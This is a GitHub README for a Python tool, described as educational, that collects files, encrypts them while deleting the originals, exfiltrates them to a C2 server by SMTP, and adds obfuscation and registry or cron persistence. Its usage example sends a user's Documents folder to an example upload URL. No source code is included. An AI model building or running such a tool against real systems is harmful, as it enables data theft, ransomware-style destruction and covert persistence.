Encrypted Files Exfiltration Tool

This Python script performs file collection, encryption, and exfiltration as part of a simulated cybersecurity exercise. It identifies files, encrypts them, and transfers them to a remote server. The tool also includes basic evasion techniques for educational purposes.

Disclaimer: This tool is for educational use only. Unauthorized use for malicious purposes is prohibited and may violate applicable laws.

Overview
The Encrypted Files Exfiltration Tool is a Python-based script that simulates identifying sensitive files, encrypting them, and transferring them to a remote server. It is designed for cybersecurity exercises such as red team operations or ethical hacking demonstrations.

Features

File Collection: Recursively searches for specific file types (e.g., .txt, .docx, .jpg) in a user-specified directory and logs the results.
Encryption: Encrypts identified files using AES encryption. A random symmetric key is generated and securely stored.
Exfiltration: Sends encrypted files to a "command and control" (C2) server using SMTP email.
Evasion Techniques: Includes code obfuscation and persistence mechanisms (e.g., registry entry and cron job).
Hybrid Encryption: Uses RSA to encrypt the AES key for added security.
Prerequisites
Before running the script, ensure you have the following installed:

Python 3.8 or higher
Required Python libraries: cryptography, requests, argparse
Install the required libraries using the following command:
pip install cryptography requests argparse

Installation

Clone the repository:
git clone https://github.com/habdelgawad1/Encrypted-Files-Exfiltration.git
Navigate to the project directory:
cd Encrypted-Files-Exfiltration
Install dependencies:
pip install -r requirements.txt
Usage
To run the script, use the following command:
python main.py --directory <target_directory> --filetypes <file_extensions> --server <server_url>

Example:
python main.py --directory /home/user/Documents --filetypes .txt,.docx,.jpg --server http://example.com/upload

Task Breakdown

Task 2: File Collection Module
Searches for specific file types in a user-specified directory.
Recursively traverses subdirectories.
Logs the list of found files to files.log.

Task 3: Encryption Module
Implements AES encryption in Python.
Generates a random symmetric key.
Encrypts identified files and deletes or overwrites the original files.
Stores the encryption key in a secure file (key.bin).
Uses hybrid encryption (RSA for the AES key).

Task 4: Exfiltration Module
Sends encrypted files to a C2 server using SMTP email.
Simulates a server with Python's cloud bucket.

Task 5: Evasion and Anti-Analysis
Adds basic evasion techniques:
Code obfuscation (e.g., renaming variables, using base64 encoding).
Persistence mechanism (e.g., adding a registry entry or cron job).

License
This project is licensed under the MIT License. See the LICENSE file for more details.

Contact
If you have any questions, suggestions, or feedback, feel free to reach out:

Author: Hussein AbdelGawad
Email: hwsabdelgawad@gmail.com
GitHub: @habdelgawad1
Thank you for using Encrypted Files Exfiltration! We hope this tool helps you enhance your understanding of secure data handling and cybersecurity practices.
